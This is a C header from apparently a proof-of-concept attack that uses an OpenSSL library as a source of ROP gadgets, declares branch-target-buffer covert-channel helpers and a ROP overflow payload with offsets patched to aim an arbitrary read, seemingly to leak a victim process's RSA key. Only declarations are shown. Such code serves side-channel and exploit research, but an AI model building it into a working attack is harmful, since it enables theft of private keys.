// The OpenSSL libcrypto donor (built without branch protection): it supplies both the ROP gadgets and (via dlsym) the
// OpenSSL API the victim uses to build its key. Loaded with the real dynamic loader at an
// ASLR'd base. Gadget addresses are the file offsets relocated to that base at runtime.
#ifndef DONOR_H
#define DONOR_H
#include <stdint.h>

struct bignum_st {
    unsigned long *d;
    int top;
    int dmax;
    int neg;
    int flags;
};
typedef struct rsa_st RSA;
typedef struct evp_pkey_st EVP_PKEY;
typedef struct bignum_st OBIGNUM;
typedef struct bignum_ctx BN_CTX;

extern RSA*     (*p_RSA_new)(void);
extern int      (*p_RSA_generate_key_ex)(RSA*, int, OBIGNUM*, void*);
extern void     (*p_RSA_get0_key)(const RSA*, const OBIGNUM**, const OBIGNUM**, const OBIGNUM**);
extern OBIGNUM* (*p_BN_new)(void);
extern int      (*p_BN_set_word)(OBIGNUM*, unsigned long);
extern char*    (*p_BN_bn2hex)(const OBIGNUM*);
extern int      (*p_BN_num_bits)(const OBIGNUM*);
extern EVP_PKEY*(*p_EVP_PKEY_new)(void);
extern int      (*p_EVP_PKEY_set1_RSA)(EVP_PKEY*, RSA*);
extern BN_CTX*  (*p_BN_CTX_new)(void);
extern int      (*p_BN_mod_exp)(OBIGNUM*, const OBIGNUM*, const OBIGNUM*, const OBIGNUM*, BN_CTX*);
extern OBIGNUM* (*p_BN_bin2bn)(const unsigned char*, int, OBIGNUM*);
extern int      (*p_BN_cmp)(const OBIGNUM*, const OBIGNUM*);
extern int      (*p_BN_bn2bin)(const OBIGNUM*, unsigned char*);

void load_donor(void);      // dlopen libcrypto, discover its runtime base and .bss
void resolve_syms(void);    // dlsym the OpenSSL API, call in both processes before fork
int  verify_gadgets(void);  // 0 if every gadget's first opcode matches at the runtime base, else 1
void donor_banner(void);    // print the runtime base / .bss line

int  donor_transmit_set(void);        // BTB set of the covert-channel branch (the signal)
int  donor_tail_set(void);            // BTB set of the gate branch (excluded from decoys)
int  donor_transmit_line_off(void);   // its offset within the 64-byte line (probes must match it)

// The ROP overflow the attacker delivers. build_payload assembles it once, then the attacker patches
// only OFF_X0/OFF_BIT per shot to aim the arbitrary read.
extern uint8_t *payload;
#define CHAIN_OFF 0x48
#define OFF_X0    32
#define OFF_BIT   424
#define OFF_WT    888
void build_payload(void);

#endif
